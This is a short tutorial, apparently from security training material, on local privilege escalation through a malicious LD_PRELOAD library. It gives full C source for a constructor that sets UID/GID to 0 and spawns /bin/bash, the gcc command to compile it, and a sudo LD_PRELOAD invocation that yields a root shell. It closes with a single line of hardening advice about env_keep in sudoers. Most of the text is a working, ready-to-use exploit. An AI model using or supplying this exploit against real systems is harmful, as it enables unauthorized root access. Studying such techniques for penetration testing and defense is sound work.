Crafting a Malicious `LD_PRELOAD` Library

Step-by-step creation and compilation of an exploit shared library.

`malicious.c` - The Exploit Code

This C code defines a constructor function that sets UID/GID to 0 and spawns a root shell when the library is loaded.

#include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> void __attribute__ ((constructor)) init (void) { setuid(0); setgid(0); system("/bin/bash"); }
  • •**`__attribute__ ((constructor))`**: Ensures `init` runs on library load.
  • •**`setuid(0); setgid(0);`**: Elevates privileges to root.
  • •**`system("/bin/bash");`**: Spawns a root shell.
Key Takeaway

The constructor function in a shared library is key to executing arbitrary code upon library loading for `LD_PRELOAD` exploits.

Compilation and Execution

Compile the C code into a shared library, then use `LD_PRELOAD` to inject it into a `sudo`-allowed command.

# Compile the shared library gcc -shared -o /tmp/malicious.so /tmp/malicious.c # Execute with LD_PRELOAD sudo LD_PRELOAD=/tmp/malicious.so /usr/bin/id

Explanation

The `gcc` command creates `malicious.so`. Then, `sudo` executes `/usr/bin/id` (or any `sudo`-allowed command), but `LD_PRELOAD` forces `malicious.so` to load first, triggering the root shell.

Security Best Practice

Administrators should avoid `env_keep=LD_PRELOAD` in `sudoers` to prevent this powerful attack vector.
